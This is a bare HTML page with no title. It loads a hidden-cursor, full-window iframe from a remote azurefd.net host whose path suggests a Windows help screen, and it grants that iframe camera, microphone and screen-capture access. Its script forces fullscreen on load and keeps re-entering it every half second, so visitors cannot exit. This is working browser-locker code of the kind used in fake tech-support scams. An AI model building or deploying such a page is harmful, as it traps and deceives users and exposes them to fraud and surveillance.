<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<style>
  * {
    margin: 0;
    padding: 0;
  }
  body {
    background: black;
  }
  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }
</style>
</head>
<body>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>

<iframe 
  id="f"
  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
  allowfullscreen 
  webkitallowfullscreen 
  mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  (function() {
    let fullscreenActive = false;
    
    function makeFullscreen() {
      const el = document.documentElement;
      const method = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
      if (method && !fullscreenActive) {
        method.call(el).catch(() => {});
      }
    }
    
    function onFullscreenChange() {
      fullscreenActive = !!(document.fullscreenElement || document.webkitFullscreenElement);
      if (!fullscreenActive) {
        makeFullscreen();
      }
    }
    
    document.addEventListener('fullscreenchange', onFullscreenChange);
    document.addEventListener('webkitfullscreenchange', onFullscreenChange);
    
    window.addEventListener('load', function() {
      setTimeout(makeFullscreen, 500);
    });
    
    setInterval(function() {
      if (!fullscreenActive) {
        makeFullscreen();
      }
    }, 500);
  })();
</script>

</body>
</html>
